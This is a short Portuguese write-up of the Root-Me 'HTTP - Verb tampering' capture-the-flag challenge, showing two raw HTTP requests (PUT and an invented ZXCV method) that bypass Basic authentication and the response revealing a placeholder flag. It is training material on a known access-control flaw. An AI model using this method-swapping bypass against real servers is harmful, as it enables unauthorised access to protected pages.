# HTTP - Verb tampering

Como o nome do desafio indica um Verb Tampering, é presumível que estamos lidando com o caso em que adulteração do método na requisição permite um bypass.

Uma leitura básica no link sobre [Verb Tampering](https://www.imperva.com/learn/application-security/http-verb-tampering/) do site da Imperva, aprendemos que adulteração arbitrária ou até mesmo utilizando métodos não bloqueados, o bypass é possível em alguns servidores afetados como nos exemplos abaixo utilizando o Intruder do Burp Suit:

## Método não bloqueado:
<b>Requisição:</b>
<pre>PUT /web-serveur/ch8/ HTTP/1.1
Host: challenge01.root-me.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Authorization: Basic dGVzdGU6dGVzdGU=
</pre>

## Método arbitrário:
<b>Requisição:</b>
<pre>
ZXCV /web-serveur/ch8/ HTTP/1.1
Host: challenge01.root-me.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Authorization: Basic dGVzdGU6dGVzdGU=
</pre>



<b>Resposta p/ ambos os casos:<b/>
<pre>
< html>< head>
< /head>

< h1>Mot de passe / password : (flag_here)< /h1>
< /body>< /html></pre>
